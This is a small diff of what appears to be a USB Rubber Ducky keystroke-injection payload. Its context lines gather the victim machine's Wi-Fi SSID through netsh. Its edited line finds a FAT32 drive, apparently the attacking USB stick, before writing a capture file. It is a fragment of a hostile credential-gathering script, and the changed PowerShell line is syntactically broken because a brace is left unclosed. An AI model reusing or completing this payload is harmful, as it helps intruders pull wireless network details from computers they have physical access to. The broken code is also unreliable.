@@ -18,7 +18,7 @@ DELAY 1000
 REM --> Getting SSID
 STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
 ENTER
-STRING $driveLetter = Get-WMIObject Win32_Volume | ? { $_.Label -eq  '}' | select Name
+STRING $driveLetter = Get-WMIObject Win32_Volume | ? { $_.FileSystem -eq 'FAT32' | select Name
 ENTER
 
 REM --> Creating A.txt
